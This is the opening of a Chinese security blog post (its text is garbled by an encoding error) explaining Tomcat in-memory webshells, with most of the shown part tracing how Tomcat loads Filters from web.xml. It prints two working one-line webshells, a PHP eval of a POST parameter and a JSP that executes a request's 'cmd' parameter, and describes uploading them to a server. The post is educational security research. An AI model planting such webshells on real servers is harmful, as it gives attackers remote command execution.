<!DOCTYPE html>
<html lang="en-uk" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='å†™åœ¨å‰é¢ æœ¬æ–‡æ˜¯Javaå†…å­˜é©¬çš„ç¬¬ä¸€ç¯‡å†…å®¹ï¼Œé€šè¿‡é˜…è¯»æœ¬æ–‡ï¼Œæˆ‘ä»¬å°†ä¸€èµ·äº†è§£ï¼š Tomcatä¸­è‡ªå®šä¹‰çš„Filter, Listener, Servlet, Valveæ˜¯å¦‚ä½•è¢«æ³¨å†Œåˆ°æœåŠ¡'><title>JavaSec - å†…å­˜é©¬ - Tomcat</title>

<link rel='canonical' href='https://ginkgo.org.cn/posts/javasec_memshell_tomcat/'>

<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='JavaSec - å†…å­˜é©¬ - Tomcat'>
<meta property='og:description' content='å†™åœ¨å‰é¢ æœ¬æ–‡æ˜¯Javaå†…å­˜é©¬çš„ç¬¬ä¸€ç¯‡å†…å®¹ï¼Œé€šè¿‡é˜…è¯»æœ¬æ–‡ï¼Œæˆ‘ä»¬å°†ä¸€èµ·äº†è§£ï¼š Tomcatä¸­è‡ªå®šä¹‰çš„Filter, Listener, Servlet, Valveæ˜¯å¦‚ä½•è¢«æ³¨å†Œåˆ°æœåŠ¡'>
<meta property='og:url' content='https://ginkgo.org.cn/posts/javasec_memshell_tomcat/'>
<meta property='og:site_name' content='Under The Ginkgo'>
<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='memshell' /><meta property='article:tag' content='java_sec' /><meta property='article:tag' content='tomcat' /><meta property='article:published_time' content='2022-10-25T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-02T18:13:03&#43;08:00'/>
<meta name="twitter:title" content="JavaSec - å†…å­˜é©¬ - Tomcat">
<meta name="twitter:description" content="å†™åœ¨å‰é¢ æœ¬æ–‡æ˜¯Javaå†…å­˜é©¬çš„ç¬¬ä¸€ç¯‡å†…å®¹ï¼Œé€šè¿‡é˜…è¯»æœ¬æ–‡ï¼Œæˆ‘ä»¬å°†ä¸€èµ·äº†è§£ï¼š Tomcatä¸­è‡ªå®šä¹‰çš„Filter, Listener, Servlet, Valveæ˜¯å¦‚ä½•è¢«æ³¨å†Œåˆ°æœåŠ¡">
    <link rel="shortcut icon" href="/img/favicon.ico" />

<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
                            height="237" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ§</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/medic0803'
                        target="_blank"
                        title="A_GitHub"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='mailto:medicwrf@gmail.com'
                        target="_blank"
                        title="B_E-mail"
                    >
                        
                        
                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/java_sec/" >
                java_sec
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/posts/javasec_memshell_tomcat/">JavaSec - å†…å­˜é©¬ - Tomcat</a>
        </h2>
    
        
    </div>

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Oct 25, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    29 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>
</header>

    <section class="article-content">
    
    
    <h2 id="å†™åœ¨å‰é¢">å†™åœ¨å‰é¢</h2>
<p>æœ¬æ–‡æ˜¯Javaå†…å­˜é©¬çš„ç¬¬ä¸€ç¯‡å†…å®¹ï¼Œé€šè¿‡é˜…è¯»æœ¬æ–‡ï¼Œæˆ‘ä»¬å°†ä¸€èµ·äº†è§£ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>Tomcatä¸­è‡ªå®šä¹‰çš„Filter, Listener, Servlet, Valveæ˜¯å¦‚ä½•è¢«æ³¨å†Œåˆ°æœåŠ¡å™¨ä¸­çš„ï¼› <!-- raw HTML omitted --></li>
<li>ä»¥åŠTomcatåœ¨å¯åŠ¨æ—¶æ˜¯å¦‚ä½•åŠ è½½ï¼Œåœ¨å¯åŠ¨åæ˜¯å¦‚ä½•è°ƒç”¨è¿™äº›ç»„ä»¶çš„ç›¸å…³æ–¹æ³•çš„ï¼› <!-- raw HTML omitted --></li>
<li>Filter, Listener, Servlet, Valveå†…å­˜é©¬çš„åŸç†ä»¥åŠPOCï¼› <!-- raw HTML omitted --></li>
</ol>
<p>åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰ï¼Œæˆ–è€…åœ¨é˜…è¯»ä¸­é‡åˆ°ä¸æ¸…æ¥šçš„æ¦‚å¿µæ—¶ï¼Œå¯ä»¥ç»“åˆæˆ‘çš„ä¸Šä¸€ç¯‡æ–‡ç« ï¼š<a class="link" href="https://ginkgo.org.cn/posts/javasec_javaweb_tomcat/"  target="_blank" rel="noopener"
    >JavaSec - JavaWeb - Tomcat æ¡†æ¶ä»¥åŠä¸Servletä¹‹é—´çš„è”ç³»</a> æ¥ä½œä¸ºå‚è€ƒï¼Œä¹Ÿå¯ä»¥é˜…è¯»è¯¥æ–‡ä¸­çš„å¼•ç”¨æ¥è·å¾—æ›´å¥½çš„ç†è§£ã€‚ <!-- raw HTML omitted --></p>
<h2 id="ä»€ä¹ˆæ˜¯å†…å­˜é©¬-å’Œä¸€å¥è¯æœ¨é©¬æœ‰ä»€ä¹ˆåŒºåˆ«">ä»€ä¹ˆæ˜¯å†…å­˜é©¬ï¼Ÿå’Œä¸€å¥è¯æœ¨é©¬æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2>
<p>æˆ‘ä»¬å…ˆæ¥å›é¡¾ä¸€ä¸‹æˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„ä¸€å¥è¯æœ¨é©¬ï¼š <!-- raw HTML omitted --></p>
<ul>
<li>PHPä¸€å¥è¯æœ¨é©¬ï¼š <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><ul>
<li>JSPä¸€å¥è¯æœ¨é©¬ï¼š <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">));%&gt;</span>
</span></span></code></pre></div><p>æˆ‘ä»¬ä»¥å‰éƒ½æ˜¯ä¸€èˆ¬éƒ½æ˜¯ä¾é æ–‡ä»¶ä¸Šä¼ ï¼Œå°†ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ï¼Œæ¥ç€å†ç”¨èšå‰‘æ¥ä¸æ–‡ä»¶è¿›è¡Œè¿æ¥äº¤äº’ï¼› <!-- raw HTML omitted --></p>
<p>è™½ç„¶ä¸€å¥è¯æœ¨é©¬éå¸¸çš„æ–¹ä¾¿ï¼Œä½†æ˜¯è¿™æ ·çš„æ–¹æ³•çš„ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä¼šç•™ä¸‹æ–‡ä»¶æ¥è¿›è¡Œäº¤äº’ï¼Œè¿™æ ·çš„æ–‡ä»¶å¾ˆå®¹æ˜“è¢«æ£€æµ‹åˆ é™¤ï¼› <!-- raw HTML omitted --></p>
<blockquote>
<p>é‚£å†…å­˜é©¬å°±ä¸éœ€è¦æ–‡ä»¶ä¸Šä¼ äº†å—ï¼Ÿ <!-- raw HTML omitted --></p>
</blockquote>
<p>é‚£ä¹Ÿä¸æ˜¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦ç”¨æ–‡ä»¶ä¸Šä¼ æ¥ä¸Šä¼ è„šæœ¬ï¼Œæ¥ç€æ‰§è¡Œä¹‹åï¼Œå°†æœ¨é©¬çš„å†…å®¹æ³¨å†Œåˆ°æœåŠ¡å™¨çš„æœåŠ¡ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬çš„æœ¨é©¬å°±ä¼šæŒç»­åœ°ä¿ç•™åœ¨æœåŠ¡å™¨çš„å†…å­˜é‡Œï¼Œä¹Ÿå°±ä¸å®¹æ˜“è¢«æ£€æµ‹åˆ é™¤äº†ã€‚ <!-- raw HTML omitted --></p>
<p>æœ¬æ–‡å°±æ¥ç€é‡ä»‹ç»Tomcatæœ‰å…³çš„å››ç§å†…å­˜é©¬ï¼šFilter, Listener, Servletä»¥åŠValveå››ç§å½¢æ€ã€‚ <!-- raw HTML omitted --></p>
<h2 id="filterå‹">Filterå‹</h2>
<p>Filteræ˜¯Java Webçš„ä¸‰å¤§ç»„ä»¶ä¹‹ä¸€ï¼Œå…¶åŠŸèƒ½æ˜¯åœ¨Servletè°ƒç”¨ <code>service()</code> æ–¹æ³•æ­£å¼åœ°å¤„ç†è¯·æ±‚ä¹‹å‰ï¼Œå¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤ï¼ˆe.g., æ˜¯å¦å·²ç»ç™»é™†ï¼Œæˆ–è€…æ˜¯å¦æ‹¥æœ‰è®¿é—®æƒé™ç­‰ï¼‰ï¼Œå¹¶ä¸”ä»¥è´£ä»»é“¾çš„å½¢å¼ï¼Œåˆ›å»ºä¸€ä¸ªFilterChainæ‰¿è½½å¤šä¸ªä¸åŒçš„Filteræ¥è¿›è¡Œä¸åŒçš„è¿‡æ»¤æ“ä½œã€‚ <!-- raw HTML omitted --></p>
<p>Filterå†…å­˜é©¬çš„æœ¬è´¨å°±æ˜¯é€šè¿‡ä¸Šä¼ ä¸€ä¸ªJSPæ–‡ä»¶ï¼Œæ‰§è¡Œè¿™ä¸ªJSPæ–‡ä»¶å¯ä»¥å‘æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­åŠ¨æ€åœ°åŠ è½½ä¸€ä¸ªFilterå®ä¾‹ï¼Œä»è€Œåœ¨å¯¹äºè¯·æ±‚è¿›è¡Œè¿‡æ»¤çš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚ <!-- raw HTML omitted --></p>
<h3 id="ä¸€ä¸ªæ­£å¸¸çš„filteræ˜¯å¦‚ä½•è¢«åŠ è½½ä»¥åŠä½¿ç”¨çš„">ä¸€ä¸ªæ­£å¸¸çš„Filteræ˜¯å¦‚ä½•è¢«åŠ è½½ä»¥åŠä½¿ç”¨çš„ï¼Ÿ</h3>
<ul>
<li>ä»web.xmlä¸­è¢«åŠ è½½ï¼ŒconfigureContext()ä¸­ <!-- raw HTML omitted --></li>
<li>startInternal()è¢«åˆå§‹åŒ–å’ŒåŠ è½½ <!-- raw HTML omitted -->
<ul>
<li>å­˜æ”¾åœ¨å„ç§HahsMapä¸­ <!-- raw HTML omitted --></li>
</ul>
</li>
<li>è°ƒç”¨æ—¶è¢«FilterChainä½¿ç”¨ <!-- raw HTML omitted --></li>
</ul>
<p>åœ¨æˆ‘ä»¬å¦è¾Ÿè¹Šå¾„ä¹‹å‰ï¼Œå…ˆæ¥ä¸€èµ·çœ‹çœ‹ç¨‹åºå‘˜åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯å¦‚ä½•æ­£å¸¸åœ°å°†ä¸€ä¸ªFilteræ³¨å†Œåˆ°TomcatæœåŠ¡å™¨ä¸­ï¼Œå¹¶å¦‚ä½•åœ¨è¯·æ±‚çš„å¤„ç†ä¸­å‘æŒ¥ä½œç”¨çš„ï¼› <!-- raw HTML omitted --></p>
<h4 id="å¼€å‘è‡ªå®šä¹‰filterç±»">å¼€å‘è‡ªå®šä¹‰Filterç±»</h4>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ–°å»ºä¸€ä¸ªFilterç±»ï¼Œå®ƒéœ€è¦å®ç°Filteræ¥å£å¹¶å®ç°æ¥å£ä¸­çš„æ–¹æ³•ï¼š <strong>doFilter()</strong>; <!-- raw HTML omitted --></p>
<p>ä¸‹é¢æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªFilterå«åšHelloFilter, åŒæ—¶é‡å†™äº†dofilteræ–¹æ³•ï¼Œè¦æ±‚å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚ï¼Œéœ€è¦åŒ…å«userè¿™ä¸ªå­—æ®µï¼ˆè¡¨ç¤ºå·²ç»ç™»é™†ï¼‰ï¼Œå¦åˆ™å°±ä¼šè·³è½¬åˆ° <strong>/login.jsp</strong> é¡µé¢å»è¿›è¡Œç™»é™†ã€‚å¦‚æœå·²ç»ç™»é™†ï¼Œåˆ™è°ƒç”¨FilterChain#doFilter()æ–¹æ³•ï¼Œå»æ‰§è¡Œä¸‹ä¸€ä¸ªFilterçš„è¿‡æ»¤æ“ä½œã€‚ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-25_09-50-21_screenshot.png"
         alt="Figure 1: HelloFilterè¿‡æ»¤å™¨" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted -->HelloFilterè¿‡æ»¤å™¨</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹ <strong>web.xml</strong> é…ç½®æ–‡ä»¶ï¼Œå°†è¿™ä¸ªæ–°å»ºçš„Filteræ³¨å†Œåˆ°TomcatæœåŠ¡å™¨ä¸­ï¼Œé‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨ä¸­è¿™ä¸ªFilterå°±å¯ä»¥èµ·æ•ˆäº†ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>
<p>&lt;filter&gt;å…ƒç´ å®šä¹‰äº†Filterçš„åå­—ä»¥åŠçœŸå®çš„ç±»å; <!-- raw HTML omitted --></p>
</li>
<li>
<p>&lt;filter-mapping&gt;åˆ™å®šäº†éœ€è¦è¿‡æ»¤çš„è¯·æ±‚èŒƒå›´ï¼Œæ¯”å¦‚è¿™é‡Œçš„ <code>/admin/*</code> å°±è¡¨ç¤º <code>/admin/</code> ç›®å½•ä¸‹çš„æ‰€æœ‰çš„æ–‡ä»¶çš„è®¿é—®éƒ½éœ€è¦ç»è¿‡è¿‡æ»¤ï¼ˆéƒ½éœ€è¦ç™»é™†ï¼‰ï¼› <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;filter&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-name&gt;</span>HelloFilter<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-class&gt;</span>pers.javasec.javafilter.HelloFilter<span class="nt">&lt;/filter-class&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/filter&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-name&gt;</span>HelloFilter<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;url-pattern&gt;</span>/admin/*<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/filter-mapping&gt;</span>
</span></span></code></pre></div></li>
</ol>
<p>è‡³æ­¤ï¼Œä¸€ä¸ªFilterå°±å·²ç»æ³¨å†Œç»“æŸäº†ï¼Œä¸‹ä¸€æ¬¡å¯åŠ¨Tomcatä¹‹åï¼Œè¿™ä¸ªFilterå°±ä¼šå¼€å§‹æ‹…è´Ÿè¿‡æ»¤å·¥ä½œï¼› <!-- raw HTML omitted --></p>
<p>æ¥ç€æˆ‘ä»¬æ¥çœ‹è¿™ä¸ªFilteræ˜¯å¦‚ä½•è¢«Tomcatæ‰€åŠ è½½ï¼Œåˆå§‹åŒ–ä»¥åŠåœ¨è¯·æ±‚çš„è¿‡æ»¤ä¸­å‘æŒ¥ä½œç”¨çš„ï¼› <!-- raw HTML omitted --></p>
<h4 id="tomcatåœ¨å¯åŠ¨æ—¶åŠ è½½filter">Tomcatåœ¨å¯åŠ¨æ—¶åŠ è½½Filter</h4>
<p>Tomcatåœ¨å¯åŠ¨ä¹‹åä¼šé€šè¿‡ContextConfig#configureContext()æ–¹æ³•å°† <strong>web.xml</strong> ä¸­çš„æ‰€æœ‰é…ç½®ä¿¡æ¯è¯»å–å¹¶è¿›è¡Œä¿å­˜ï¼Œæˆ‘ä»¬è¿™é‡Œä»…æå–äº†Filterçš„éƒ¨åˆ†ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>è¿™é‡Œçš„contextæŒ‡çš„æ˜¯Tomcatçš„Containerå®¹å™¨ï¼Œå®ç°ç±»ä¸ºStandardContextï¼Œå…·ä½“è¯·å‚è€ƒTomcatæ¡†æ¶æ–‡ç« ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼› <!-- raw HTML omitted --></li>
<li>web.xmlä¸­çš„&lt;filter&gt;æ ‡ç­¾çš„å†…å®¹ä¸­çš„é…ç½®ä¿¡æ¯ä¼šä»¥ <code>FilterDef</code> çš„å½¢å¼è¢«Tomcatä¿å­˜ï¼› <!-- raw HTML omitted --></li>
<li>&lt;filter-mapping&gt;æ ‡ç­¾çš„å†…å®¹åˆ™ä»¥ <code>FilterMap</code> çš„å½¢å¼è¢«ä¿å­˜ï¼› <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">configureContext</span><span class="o">(</span><span class="n">WebXml</span> <span class="n">webxml</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// åŠ è½½Filterçš„é…ç½®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="o">(</span><span class="n">FilterDef</span> <span class="n">filter</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getFilters</span><span class="o">().</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">filter</span><span class="o">.</span><span class="na">getAsyncSupported</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filter</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="s">&#34;false&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">context</span><span class="o">.</span><span class="na">addFilterDef</span><span class="o">(</span><span class="n">filter</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getFilterMappings</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">context</span><span class="o">.</span><span class="na">addFilterMap</span><span class="o">(</span><span class="n">filterMap</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>æ¥ç€Tomcatåœ¨å¯åŠ¨ä¸­ä¼šè°ƒç”¨StandardContext#startInternal()ï¼ŒstartInternal()ä¼šæ¥ç€è°ƒç”¨ StanddardContext#filterStart()æ–¹æ³•æ¥å¯¹filterè¿›è¡Œåˆå§‹åŒ–ï¼› <!-- raw HTML omitted --></p>
<p>å…¶ä¼šä¸ºæˆ‘ä»¬ä¹‹å‰ä¿å­˜çš„æ¯ä¸€ä¸ª <code>FilterDef</code> éƒ½åˆ›å»ºä¸€ä¸ª <code>FilterConfig</code> æ¥å°è£…ä¿å­˜ä¿¡æ¯ï¼› <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">filterStart</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Instantiate and record a FilterConfig for each defined filter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">boolean</span> <span class="n">ok</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">synchronized</span> <span class="o">(</span><span class="n">filterConfigs</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">filterConfigs</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span>
